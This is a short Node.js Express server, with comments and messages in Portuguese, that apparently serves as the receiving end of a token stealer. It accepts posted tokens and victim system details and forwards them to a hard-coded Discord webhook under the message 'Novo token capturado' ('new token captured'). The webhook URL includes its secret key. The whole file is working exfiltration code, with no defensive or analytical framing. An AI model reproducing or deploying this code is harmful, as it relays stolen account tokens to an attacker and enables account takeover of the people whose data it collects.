const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());

app.post('/send-data', async (req, res) => {
    const { token, systemInfo } = req.body;
    
    if (!token) {
        return res.status(400).send('Token ausente');
    }

    try {
        // Enviar dados para o webhook do Discord
        const webhookUrl = 'https://discord.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX';
        const message = {
            content: `Novo token capturado: ${token}`,
            embeds: [
                {
                    title: 'Informações do Sistema',
                    fields: [
                        { name: 'Plataforma', value: systemInfo.platform },
                        { name: 'User-Agent', value: systemInfo.userAgent }
                    ]
                }
            ]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (response.ok) {
            res.send('Dados enviados para o Discord');
        } else {
            res.status(500).send('Erro ao enviar dados para o Discord');
        }
    } catch (error) {
        console.error('Erro ao enviar dados:', error);
        res.status(500).send('Erro no servidor');
    }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});
